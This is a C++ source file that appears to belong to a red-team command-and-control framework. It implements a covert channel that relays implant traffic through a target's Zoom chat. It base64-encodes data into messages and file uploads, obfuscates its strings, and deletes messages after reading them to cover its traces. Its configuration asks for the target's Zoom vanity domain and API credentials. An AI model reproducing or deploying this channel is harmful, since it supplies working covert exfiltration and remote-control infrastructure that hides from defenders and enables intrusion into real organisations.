#include "Stdafx.h"
#include "Zoom.h"
#include "Common/FSecure/Crypto/Base64.h"


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::Zoom::Zoom(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	auto [userAgent, accountId, clientId, clientSecret,  email, vanityDomain, channelName] = arguments.Read<std::string, std::string, std::string, std::string, std::string, std::string, std::string>();
	 //userAgent, std::string const& client_id, std::string const& client_secret, std::string const& account_id, std::string const& email, std::string const& vanity_domain, std::string const& channelName)

	m_ZoomObj = FSecure::Zoom{ userAgent, accountId, clientId, clientSecret, email, vanityDomain, channelName};
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::Zoom::OnSendToChannel(ByteView data)
{
	//Using file upload API for staging i.e. data greater than 3 messages in size.
	size_t actualPacketSize = 0;
	if (data.size() > 1000)
	{
		std::string messageId = m_ZoomObj.WriteMessage(m_outboundDirectionName + OBF(":W"));
		constexpr auto maxPacketSize = cppcodec::base64_rfc4648::decoded_max_size(1024*1024*10); // 10MB - should be a 20MB limit;
		actualPacketSize = std::min(maxPacketSize, data.size());
		auto sendData = data.SubString(0, actualPacketSize);
		m_ZoomObj.UploadFile(cppcodec::base64_rfc4648::encode<ByteVector>(sendData.data(), sendData.size()), messageId);

		//Update the original first message with "C2S||S2C:Done" - these messages will always be read in onRecieve.
		std::string message = m_outboundDirectionName + OBF(":D");
		m_ZoomObj.UpdateMessage(message, messageId);
	}
	else
	{
		//Write the full data into the thread.
		constexpr auto maxPacketSize = cppcodec::base64_rfc4648::decoded_max_size(1024);
		actualPacketSize = std::min(maxPacketSize, data.size());
		auto sendData = data.SubString(0, actualPacketSize);

		m_ZoomObj.WriteMessage(m_outboundDirectionName + OBF(":D:") + cppcodec::base64_rfc4648::encode(sendData.data(), sendData.size()));
	}

	return actualPacketSize;
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::Zoom::OnReceiveFromChannel()
{
	std::vector<FSecure::ByteVector> ret;
	auto all_messages = m_ZoomObj.GetAllMessages();
	auto direction_messages = GetMessagesByDirection(all_messages, m_inboundDirectionName + OBF(":D"));

	std::vector<std::string> deleteMessageIds;

	for (std::vector<std::string>::reverse_iterator messageId = direction_messages.rbegin(); messageId != direction_messages.rend(); ++messageId)
	{
		// Get all packets sent in a single message inbound:Done:base64message
		for (auto& m : all_messages)
		{
			if (m.contains(OBF("id"))) {
				auto id = m[OBF("id")].get<std::string>();
				if (id == *messageId) {
					if (m.contains(OBF("message"))) {
						std::string_view data = m[OBF("message")].get<std::string_view>();
						std::string direction = m_inboundDirectionName + OBF(":D:");
						std::string actual_data;

						if (
							data.size() >= direction.size() &&
							data.substr(0, direction.size()) == direction
							)
						{
							// Split the message on : to get the third chunk - base64 message
							size_t pos1 = data.find(':');
							if (pos1 == std::string_view::npos)
								break;

							size_t pos2 = data.find(':', pos1 + 1);
							if (pos2 == std::string_view::npos)
								break;

							size_t pos3 = data.find(':', pos2 + 1); // Optional: in case there are more parts
							actual_data = data.substr(pos2 + 1, pos3 == std::string_view::npos ? std::string_view::npos : pos3 - pos2 - 1);
							auto relayMsg = cppcodec::base64_rfc4648::decode(actual_data); //Base64 decode the entire message
							ret.emplace_back(std::move(relayMsg));
						}
					}
				}
			}
		}


		//Get all of the messages sent as files in replies
		auto replies = ReadReplies(all_messages, *messageId);

		for (auto&& reply : replies)
		{
			std::string message;
			message.append(reply.second);
			deleteMessageIds.push_back(std::move(reply.first)); //get all of the ids for later deletion
			auto relayMsg = cppcodec::base64_rfc4648::decode(message); //Base64 decode the entire message
			ret.emplace_back(std::move(relayMsg));
		}

		deleteMessageIds.push_back(std::move(*messageId));
	}

	if (deleteMessageIds.size() > 0)
		m_ZoomObj.DeleteMessages(deleteMessageIds); //delete read messages and replies.

	return ret;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<std::string> FSecure::C3::Interfaces::Channels::Zoom::GetMessagesByDirection(json const& messages, std::string const& direction)
{
	std::vector<std::string> direction_messages;

	for (auto& m : messages)
	{
		std::string_view data = m[OBF("message")].get<std::string_view>();

		//make sure it's a message we care about
		if (
			data.size() >= direction.size() &&
			data.substr(0, direction.size()) == direction
			)
		{
			direction_messages.emplace_back(m[OBF("id")].get<std::string>());
		}
	}
	return direction_messages;
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<std::pair<std::string, std::string>> FSecure::C3::Interfaces::Channels::Zoom::ReadReplies(json const& messages, std::string const& messageId)
{
	std::vector<std::pair<std::string, std::string>> replies;

	for (auto& reply : messages)
	{
		if (reply.contains(OBF("reply_main_message_id"))) {
			auto id = reply[OBF("reply_main_message_id")].get<std::string>();
			if (id == messageId) {
				std::string text;
				if (reply.contains(OBF("download_url")))
				{
					std::string fileUrl = reply[OBF("download_url")].get<std::string>();
					text = m_ZoomObj.GetFile(fileUrl);
				}
				else
					text = reply[OBF("message")].get<std::string>();
				replies.emplace_back(std::move(reply[OBF("id")]), std::move(text));
			}
		}
	}
	return replies;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::Zoom::DeleteChannel()
{
	m_ZoomObj.DeleteChannel();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::Zoom::DeleteAllMessages()
{
	m_ZoomObj.DeleteAllMessages();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::Zoom::OnRunCommand(ByteView command)
{
	auto commandCopy = command; //each read moves ByteView. CommandCopy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		DeleteChannel();
		return {};
	case 1:
		DeleteAllMessages();
		return {};
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Channels::Zoom::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 6,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 6,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "User-Agent Header",
				"description": "The User-Agent header to set."
			},
			{
				"type": "string",
				"name": "Account ID",
				"min": 20,
				"description": "Zoom Server to Server Account ID"
			},
			{
				"type": "string",
				"name": "Client ID",
				"min": 20,
				"description": "Zoom Server to Server Client ID"
			},
			{
				"type": "string",
				"name": "Client Secret",
				"min": 30,
				"description": "Zoom Server to Server Client Secret"
			},
			{
				"type": "string",
				"name": "Email",
				"description": "Account owner's email"
			},
			{
				"type": "string",
				"name": "Vanity Domain",
				"description": "Target's Zoom vanity domain"
			},
			{
				"type": "string",
				"name": "Channel name",
				"min": 4,
				"randomize": true,
				"description": "Name of Zoom's channel used by api"
			}
		]
	},
	"commands": [
		{
			"name": "Delete channel",
			"id": 0,
			"description": "Delete channel and all messages within it.",
			"arguments": []
		},
		{
			"name": "Clear all messages",
			"id": 1,
			"description": "Delete all messages in channel.",
			"arguments": []
		}
	]
}
)_";
}

